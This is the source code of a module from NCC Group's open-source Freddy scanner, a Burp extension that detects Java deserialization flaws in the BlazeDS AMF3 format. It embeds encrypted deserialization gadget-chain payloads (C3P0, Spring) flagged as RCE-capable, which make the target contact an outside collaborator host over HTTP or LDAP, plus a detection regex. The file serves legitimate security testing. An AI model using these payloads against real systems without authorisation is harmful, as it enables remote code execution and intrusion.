// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the AMF 3 format support of the Java
 * BlazeDS library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class BlazeDSAMF3Module extends FreddyModuleBase {
    //C3P0WrapperConnPool payload data
    private static final int C3P0WRAP_PAYLOAD_CMD_OFFSET = 1153;
    private final String C3P0WRAP_PREFIX_B64 = decrypt("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");
    private final String C3P0WRAP_SUFFIX_B64 = decrypt("1CnJChbsPdDjfrLdUKMHlxkk33Q/u8fJcTATux0f39o=");
    //SpringPropertyPathFactory payload data
    private static final int SPPF_PAYLOAD_CMD_OFFSET = 111;
    private final String SPPF_PREFIX_B64 = decrypt("AcU0FohmlrCQ/PrVlrqk1JleKOmLI2VemElSXKgiDqB3U5A2cG0oA2Lr++kG9gQ55OTf341TosyQp6RtzgYIX1gtrhYl4j6738MoXmlbNR4yIWJIc8fT71wBNMROwTYVCXHkDasdELPqRNa0J1Zv2+poqTeCk/lqRYfmWt2lJissiunq/UglCTvfhEMZdDv01wa4dO9EA6csW556DUMzkg==");
    private final String SPPF_SUFFIX_B64 = decrypt("LIZeOsrmdiuOZtVkZYlDJnYjRHOnCZ7owHPsqPQbVPFSUP0EhRMwMK6aPdLHZtQF0I5yibpJ+mxgH4WUCLPZQ0k79s25lr8Lw+OWUa4DT+C3zBCo4OA3cyvyzbMc/5MVVHJlnwY9Zj0caPRsj96kvG2efIiToAa66cAwa8O3Enc7i28sA401ayqEqVUOyZrTMbG0E95CnjBM7qy2sQ5W2PzUTtHRMBM7y4EBw17qj4E=");
    private byte[] C3P0WRAP_PAYLOAD;
    private byte[] SPPF_PAYLOAD;

    protected void initialiseModule() {
        setName("BlazeDS-AMF3");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Initialise payload buffers
        C3P0WRAP_PAYLOAD = buildBinaryPayloadBuffer(C3P0WRAP_PREFIX_B64, C3P0WRAP_SUFFIX_B64, true); //Note, this payload isn't actually unicode but is encoded as hex-ascii so requires two bytes space per byte of payload
        SPPF_PAYLOAD = buildBinaryPayloadBuffer(SPPF_PREFIX_B64, SPPF_SUFFIX_B64, false);

        //Register active scan payloads (passive scan is handled by BlazeDSPassiveDetectionModule)
        registerActiveScanExceptionPayload(new byte[]{0x0a, 0x13, 0x17, 0x46, 0x72, 0x65, 0x64, 0x64, 0x79, 0x44, 0x65, 0x73, 0x65, 0x72, 0x00}, Pattern.compile("Cannot create class of type ((')|(&#39;))FreddyDeser((')|(&#39;))\\."));

        registerActiveScanCollaboratorPayload(PN_C3P0WCP, true);
        registerActiveScanCollaboratorPayload(PN_SPRINGPPF, true);
    }

    protected byte[] generateCollaboratorBytePayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_C3P0WCP:
                return generateBinaryPayloadWithAscHexCommand(C3P0WRAP_PAYLOAD, C3P0WRAP_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/");

            case PN_SPRINGPPF:
                return generateBinaryPayload(SPPF_PAYLOAD, SPPF_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);
        }
        return null;
    }
}
